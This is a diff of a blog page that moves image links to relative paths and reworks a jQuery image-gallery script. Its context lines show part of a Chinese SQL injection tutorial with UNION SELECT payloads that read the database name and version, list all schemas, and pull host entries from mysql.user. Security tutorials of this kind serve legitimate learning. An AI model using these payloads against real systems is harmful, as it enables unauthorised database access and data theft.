@@ -74,23 +74,23 @@
 <li>####联合查询 1,2,3字段</li>
 </ul>
 <p><code>article.php?id=1 union select 1,2,3</code></p>
-<p><img src="https://www.wileysec.com/usr/uploads/2019/03/1503278801.png" alt="1.png"></p>
+<p><img src="/uploads/2019/03/1503278801.png" alt="1.png"></p>
 <p>找到在页面中显示的字段内容后</p>
 <p><code>article.php?id=1 union select 1,database(),version()</code></p>
 <p>在显示字段的地方加入想要查询的信息</p>
-<p><img src="https://www.wileysec.com/usr/uploads/2019/03/3754273547.png" alt="2.png"></p>
+<p><img src="/uploads/2019/03/3754273547.png" alt="2.png"></p>
 <ul>
 <li>####查找其他数据库</li>
 </ul>
 <p>使用MySQL分组合并查询</p>
 <p><code>article.php?id=1 union select 1,group_concat(schema_name),3 from information_schema.schemata</code></p>
-<p><img src="https://www.wileysec.com/usr/uploads/2019/03/3264643273.png" alt="4.png"></p>
+<p><img src="/uploads/2019/03/3264643273.png" alt="4.png"></p>
 <p>这样就查询到MySQL里的所有数据库名称</p>
 <ul>
 <li>####查询其他数据库信息</li>
 </ul>
 <p><code>article.php?id=1 union select 1,group_concat(host),3 from mysql.user</code></p>
-<p><img src="https://www.wileysec.com/usr/uploads/2019/03/1042527104.png" alt="3.png"></p>
+<p><img src="/uploads/2019/03/1042527104.png" alt="3.png"></p>
 
   </section>
   <footer class="post-footer">
@@ -138,15 +138,13 @@
 </div>
 
 <script>
-    $(".post-content p").each(function(){
-      imglength = $(this).find('img').length;
-      for(i=0;i<imglength;i++){
-           obj = $(".post-content p img")[i];
-           aobj = $(obj).wrap("<a data-fancybox='gallery' no-pjax='' data-type='image' href='' id='fancybox" + i + "'></a>");
-           imghref = $(aobj).attr('src');
-           $('#fancybox' + i).attr('href',imghref);
-        }
-    });
+  imglength = $('.post-content p').find('img').length;
+  for(i=0;i<imglength;i++){
+       obj = $(".post-content p img")[i];
+       aobj = $(obj).wrap("<a data-fancybox='gallery' no-pjax='' data-type='image' href='' id='fancybox" + i + "'></a>");
+       imghref = $(aobj).attr('src');
+       $('#fancybox' + i).attr('href',imghref);
+    }
 </script>
 
 
